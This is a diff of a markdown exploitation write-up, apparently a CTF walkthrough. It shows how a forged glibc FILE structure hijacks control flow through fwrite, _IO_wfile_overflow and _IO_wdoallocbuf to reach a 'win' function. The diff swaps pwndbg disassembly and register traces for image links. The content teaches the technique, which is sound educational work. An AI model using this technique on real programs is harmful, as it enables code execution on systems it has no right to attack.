@@ -317,112 +317,17 @@ There is one more detail. `_IO_FILE` contains a `_lock` field that glibc derefer
 
 Everything is set, let's try again. This time the outer range check passes, and the first indirect call dispatches to `_IO_wfile_overflow`.
 
-```asm
-b► 0x7fa6fefee5f6 <fwrite+150>    lea    rdi, [rip + 0x1838e3]           RDI => 0x7fa6ff171ee0 (__io_vtables) ◂— 0
-   0x7fa6fefee5fd <fwrite+157>    mov    rax, qword ptr [rbx + 0xd8]     RAX, [0x183cf0e8] => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
-   0x7fa6fefee604 <fwrite+164>    mov    r14, qword ptr [rbx + 0xc8]     R14, [0x183cf0d8] => 0
-   0x7fa6fefee60b <fwrite+171>    mov    r15, qword ptr [rbx + 0x28]     R15, [0x183cf038] => 0
-   0x7fa6fefee60f <fwrite+175>    mov    r12, qword ptr [rbx + 0x20]     R12, [0x183cf030] => 0
-   0x7fa6fefee613 <fwrite+179>    mov    rdx, rax                        RDX => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
-   0x7fa6fefee616 <fwrite+182>    sub    rdx, rdi                        RDX => 0x328 (0x7fa6ff172208 - 0x7fa6ff171ee0)
-   0x7fa6fefee619 <fwrite+185>    cmp    rdx, 0x92f                      0x328 - 0x92f     EFLAGS => 0x297 [ CF PF AF zf SF IF df of iopl:00 ac ]
-   0x7fa6fefee620 <fwrite+192>  ✘ ja     fwrite+544                  <fwrite+544>
-
-   0x7fa6fefee626 <fwrite+198>    mov    qword ptr [rbp - 0x38], r9      [0x7fffb620c618] <= 1
-   0x7fa6fefee62a <fwrite+202>    mov    rdx, rcx                        RDX => 1
-   0x7fa6fefee62d <fwrite+205>    mov    rdi, rbx                        RDI => 0x183cf010 ◂— 0
-   0x7fa6fefee630 <fwrite+208>    mov    qword ptr [rbp - 0x30], r8      [0x7fffb620c620] <= 1
-   0x7fa6fefee634 <fwrite+212>    mov    qword ptr [rbp - 0x28], rcx     [0x7fffb620c628] <= 1
-   0x7fa6fefee638 <fwrite+216>    call   qword ptr [rax + 0x38]      <_IO_wfile_overflow>
-
-```
+![10](./images/10.png)
 
 The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`.
 
-```asm
-b► 0x7fa6feff5110 <_IO_wfile_overflow>        endbr64
-   0x7fa6feff5114 <_IO_wfile_overflow+4>      mov    edx, dword ptr [rdi]     EDX, [0x183cf010] => 0
-   0x7fa6feff5116 <_IO_wfile_overflow+6>      test   dl, 8                    0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff5119 <_IO_wfile_overflow+9>    ✘ jne    _IO_wfile_overflow+352      <_IO_wfile_overflow+352>
-
-   0x7fa6feff511f <_IO_wfile_overflow+15>     push   rbp
-   0x7fa6feff5120 <_IO_wfile_overflow+16>     mov    rbp, rsp                        RBP => 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
-   0x7fa6feff5123 <_IO_wfile_overflow+19>     push   rbx
-   0x7fa6feff5124 <_IO_wfile_overflow+20>     mov    ebx, esi                        EBX => 0x183cf1f0 ◂— 0x41 /* 'A' */
-   0x7fa6feff5126 <_IO_wfile_overflow+22>     sub    rsp, 0x18                       RSP => 0x7fffb620c5d0 (0x7fffb620c5e8 - 0x18)
-   0x7fa6feff512a <_IO_wfile_overflow+26>     mov    rcx, qword ptr [rdi + 0xa0]     RCX, [0x183cf0b0] => 0x183cf018 ◂— 0
-   0x7fa6feff5131 <_IO_wfile_overflow+33>     mov    rsi, qword ptr [rcx + 0x18]     RSI, [0x183cf030] => 0
-   0x7fa6feff5135 <_IO_wfile_overflow+37>     test   dh, 8                           0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff5138 <_IO_wfile_overflow+40>   ✘ jne    _IO_wfile_overflow+208      <_IO_wfile_overflow+208>
-
-   0x7fa6feff513e <_IO_wfile_overflow+46>     test   rsi, rsi                        0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff5141 <_IO_wfile_overflow+49>   ✔ je     _IO_wfile_overflow+213      <_IO_wfile_overflow+213>
-    ↓
-   0x7fa6feff51e5 <_IO_wfile_overflow+213>    mov    qword ptr [rbp - 0x18], rdi     [0x7fffb620c5d8] <= 0x183cf010 ◂— 0
-   0x7fa6feff51e9 <_IO_wfile_overflow+217>    call   _IO_wdoallocbuf             <_IO_wdoallocbuf>
-
-```
+![11](./images/11.png)
 
 Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.
 
-```asm
-b► 0x7fa6feff3020 <_IO_wdoallocbuf>       endbr64
-   0x7fa6feff3024 <_IO_wdoallocbuf+4>     mov    rax, qword ptr [rdi + 0xa0]     RAX, [0x183cf0b0] => 0x183cf018 ◂— 0
-   0x7fa6feff302b <_IO_wdoallocbuf+11>    cmp    qword ptr [rax + 0x30], 0       0 - 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff3030 <_IO_wdoallocbuf+16>  ✔ je     _IO_wdoallocbuf+24          <_IO_wdoallocbuf+24>
-    ↓
-   0x7fa6feff3038 <_IO_wdoallocbuf+24>    push   rbp
-   0x7fa6feff3039 <_IO_wdoallocbuf+25>    mov    rdx, rdi              RDX => 0x183cf010 ◂— 0
-   0x7fa6feff303c <_IO_wdoallocbuf+28>    mov    rbp, rsp              RBP => 0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 ◂— ...
-   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
-   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>
-
-   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
-   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
-   0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
-```
+![12](./images/12.png)
 
 While we're here, it is worth looking at the register state immediately before the final indirect call.
-
-```asm
- RAX  0x183cf088 ◂— 0xffffffffffffffff
- RBX  0x183cf1f0 ◂— 0x41 /* 'A' */
- RCX  0x183cf018 ◂— 0
- RDX  0x183cf010 ◂— 0
- RDI  0x183cf010 ◂— 0
- RSI  0
- R8   1
- R9   1
- R10  0
- R11  0x7fa6fefee560 (fwrite) ◂— endbr64
- R12  0
- R13  1
- R14  0
- R15  0
- RBP  0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
- RSP  0x7fffb620c5a0 —▸ 0x7fffb620c5e0 ◂— 0x20e21
-*RIP  0x7fa6feff3057 (_IO_wdoallocbuf+55) ◂— call qword ptr [rax + 0x68]
-──────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on]──────────────────────────────────────────────────────
-   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
-   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
-   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>
-
-   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
-   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
- ► 0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
-        rdi: 0x183cf010 ◂— 0
-        rsi: 0
-        rdx: 0x183cf010 ◂— 0
-        rcx: 0x183cf018 ◂— 0
-
-   0x7fa6feff305a <_IO_wdoallocbuf+58>    cmp    eax, -1
-   0x7fa6feff305d <_IO_wdoallocbuf+61>  ? jne    _IO_wdoallocbuf+133         <_IO_wdoallocbuf+133>
-
-   0x7fa6feff305f <_IO_wdoallocbuf+63>    mov    rdx, qword ptr [rbp - 8]
-   0x7fa6feff3063 <_IO_wdoallocbuf+67>    mov    rax, qword ptr [rdx + 0xa0]
-   0x7fa6feff306a <_IO_wdoallocbuf+74>    mov    rdi, qword ptr [rax + 0x30]
-```
 
 Both `RDI` and `RDX` point to the beginning of the controlled `FILE` structure. We do not directly control the first and third argument registers, but we control the memory they point to. Cool!
 
